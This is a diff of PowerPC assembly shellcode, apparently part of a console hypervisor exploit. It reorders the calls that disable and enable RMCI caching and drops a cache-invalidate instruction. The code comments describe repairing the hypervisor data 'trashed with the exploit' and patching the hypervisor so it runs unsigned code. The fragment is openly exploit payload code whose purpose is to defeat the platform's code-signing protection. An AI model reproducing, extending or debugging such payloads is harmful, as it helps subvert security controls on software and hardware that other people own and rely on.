@@ -905,7 +905,7 @@ _shell_code_start:
         stb     %r11, 0(%r1)
         li      %r11, 0xFF          # LED override
         stb     %r11, 1(%r1)
-        li      %r11, 0xFF          # color = orange?
+        li      %r11, 0xFF          # color = orange
         stb     %r11, 2(%r1)
         
         # Send the command to the SMC.
@@ -915,12 +915,6 @@ _shell_code_start:
         mtctr   %r11
         bctrl
 		
-		# Disable RMCI.
-		li		%r3, 0
-		li		%r11, HvpSetRMCI
-		mtctr	%r11
-		bctrl
-		
 		# Fix the hv data we trashed with the exploit.
 		li		%r5, 1
 		ld		%r29, (hv_restore_data_address - _shell_code_start)(%r31)
@@ -929,7 +923,13 @@ _shell_code_start:
 		li		%r11, HvpRelocateCacheLines
 		mtctr	%r11
 		bctrl
-		icbi	0, %r29
+		
+		# Disable RMCI (enable caching). This is required to modify executable memory without having
+		# to clear the entire cache line.
+		li		%r3, 0
+		li		%r11, HvpSetRMCI
+		mtctr	%r11
+		bctrl
 		
 		# Apply patches to the hypervisor so we can run unsigned code.
 		lis		%r4, 0x3860
@@ -948,7 +948,7 @@ _shell_code_start:
 		andc	%r3, %r3, %r5
 		icbi	0, %r3
 		
-		# Enable RMCI.
+		# Enable RMCI (disable caching).
 		li		%r3, 1
 		li		%r11, HvpSetRMCI
 		mtctr	%r11
